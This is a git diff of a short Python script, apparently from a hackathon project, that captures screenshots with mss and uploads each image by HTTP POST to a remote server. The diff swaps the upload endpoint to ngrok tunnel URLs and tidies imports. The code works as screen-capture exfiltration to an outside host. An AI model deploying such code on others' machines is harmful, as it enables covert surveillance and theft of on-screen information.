@@ -1,24 +1,19 @@
 from mss import mss
-from win32api import GetKeyState
-import time
-import requests
-
-from mss import mss
 import win32api
 import time
 import requests
-
+#https://d0ee-192-160-130-62.ngrok-free.app
 def take_screenshot():
     with mss() as sct:
         try:
-            response = requests.get('https://teenhacks.onrender.com/')
+            response = requests.get('https://9e90-192-160-130-62.ngrok-free.app/')
             if response.status_code != 200:
                 raise Exception('Failed to retrieve website')
         except Exception as e:
             print(f'Failed to retrieve website: {str(e)}')
             return
         screenshot_path = sct.shot(output='screenshot.png')
-        requests.post('https://teenhacks.onrender.com/upload', files={'image': open(screenshot_path, 'rb')})
+        requests.post('https://9e90-192-160-130-62.ngrok-free.app/', files={'image': open(screenshot_path, 'rb')})
 
 
 def begin_ss(start):
